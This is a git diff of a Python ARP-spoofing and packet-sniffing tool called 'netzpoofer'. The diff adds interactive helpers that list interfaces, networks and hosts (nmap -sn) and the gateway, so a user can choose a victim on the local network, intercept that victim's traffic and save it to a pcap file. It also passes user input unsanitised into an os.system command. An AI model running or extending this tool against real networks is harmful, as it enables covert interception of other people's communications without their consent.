@@ -61,24 +61,50 @@ def netzpoofer():
     print('[*] Select the sniff target IP                                       [*]')
     print('[*] Select your network gateway                                      [*]')
     print('[*] Choose between saving or not the intercepted traffic             [*]')
+    print('[*] Type [?] for help                                                [*]')
     print('[*]                                                                  [*]')
     print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
     print('')
 
     print('[*] All your network interfaces: ')
-    os.system("iwconfig | grep wlan0")
+    os.system('ip -br link | awk ' + "'{print $1}'")
     print('-------------------------------------------------------------------')
-    interface = input('Network Interface: ')   
+    interface = input('[?] Network Interface: ')
+    if(interface == '?'):
+        print('[*] Your network device is the device you use to connect to the network')
+        print('[*] If you are connected with a ethernet cable, then your interface is eth0')
+        print('[*] If you are connected with wireless, the your interface is wlan0')
+        interface = input('Network Interface: ')
+
+    print('[*] All the possible networks: ')
+    os.system("sudo ifconfig | grep inet")
+    print('-------------------------------------------------------------------')
+    net = input('[?] Network IP: ')
+    if(net == '?'):
+        print('[*] Your network address defines what network are you connected')
+        print('[*] If your IP is 192.168.0.101 and mask 255.255.255.0 ')
+        print('[*] The your network IP is 192.168.0.0')
+        net = input('Network IP: ')
+
     print('[*] All the possible targets in your network: ')
-    os.system("nmap -sn 192.168.0.0/24 | grep for")
+    os.system("nmap -sn "+ net +'/24'" | grep for")
     print('-------------------------------------------------------------------')
-    target_ip = input('Target IP: ')
-    print('[*] Is the gateway IP 192.168.0.1 ?')
-    gate = input('[Y/N] ')
-    if(gate == 'Y'):
-        gateway_ip = '192.168.0.1'
-    else:
+    target_ip = input('[?] Target IP: ')
+    if(target_ip == '?'):
+        print('[*] Here is where you choose your target IP')
+        print('[*] This IP is probably in the list generated above')
+        print('[*] The target IP needs be inside your network')
+        target_ip = input('Target IP: ')
+
+    print('[*] Possible gateway in your network: ')
+    os.system("route -n")
+    gateway_ip = input('[?] Gateway IP: ')
+    if(gateway_ip == '?'):
+        print('[*] The gateway literally the gate between you and the internet')
+        print('[*] In a simple network, this should be the routers IP')
+        print('[*] If your IP is 192.168.0.101, the your gateway is probably 192.168.0.1')
         gateway_ip = input('Gateway IP: ')
+
     print('[*] Save intercepted packets in a .pcap file?')
     gate = input('[Y/N] ')
     if(gate == 'Y'):
@@ -94,7 +120,6 @@ def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
     conf.verb = 0
     print ('[*] Setting up %s' %interface)
     gateway_mac = get_mac(gateway_ip)       
-    print(gateway_mac)
 
     if gateway_mac is None:    
         print ('[!!!] Failed to get gateway MAC. Exiting.')
@@ -130,7 +155,6 @@ def constant_sniff(interface, gateway_ip, target_ip):
     conf.verb = 0
     print ('[*] Setting up %s' %interface)
     gateway_mac = get_mac(gateway_ip)       
-    print(gateway_mac)
 
     if gateway_mac is None:    
         print ('[!!!] Failed to get gateway MAC. Exiting.')
@@ -154,6 +178,7 @@ def constant_sniff(interface, gateway_ip, target_ip):
         bpf_filter = 'ip host %s' %target_ip
         while True:
             packets = sniff(count = 1, filter = bpf_filter, iface = interface)
+            #packets = sniff(count = 1, prn = lambda x: x.show(), filter = bpf_filter, iface = interface, store = 0)
             packets.show() 
     except KeyboardInterrupt:      
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
